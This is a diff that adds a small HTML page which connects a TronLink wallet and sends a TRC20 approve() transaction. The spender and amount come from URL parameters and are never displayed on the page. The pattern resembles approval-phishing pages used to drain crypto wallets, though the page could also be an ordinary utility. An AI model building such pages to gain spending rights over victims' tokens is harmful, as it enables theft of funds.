@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>TRC20 Token Approval</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+</head>
+<body>
+  <h2>TRC20 Token Approval</h2>
+  <p>Click "Connect Wallet" to connect your TronLink wallet, then approve token spending.</p>
+  <button id="connect">Connect Wallet</button>
+  <button id="approve" disabled>Approve</button>
+
+  <script>
+    let tronWeb;
+    let tokenAddress, spender, amount;
+
+    // Parse URL parameters
+    const params = new URLSearchParams(window.location.search);
+    tokenAddress = params.get('token');
+    spender = params.get('spender');
+    amount = params.get('amount');
+
+    document.getElementById('connect').onclick = async () => {
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        tronWeb = window.tronWeb;
+        alert("Wallet connected: " + tronWeb.defaultAddress.base58);
+        document.getElementById('approve').disabled = false;
+      } else {
+        alert("Please install and log in to TronLink wallet!");
+      }
+    };
+
+    document.getElementById('approve').onclick = async () => {
+      if (!tokenAddress || !spender || !amount) {
+        alert("Invalid parameters! Please ensure token, spender, and amount are in the URL.");
+        return;
+      }
+      try {
+        const contract = await tronWeb.contract().at(tokenAddress);
+        const tx = await contract.approve(spender, amount).send();
+        alert("Transaction successful! TX: " + tx);
+      } catch (err) {
+        console.error(err);
+        alert("Approval failed: " + err.message);
+      }
+    };
+  </script>
+</body>
+</html>
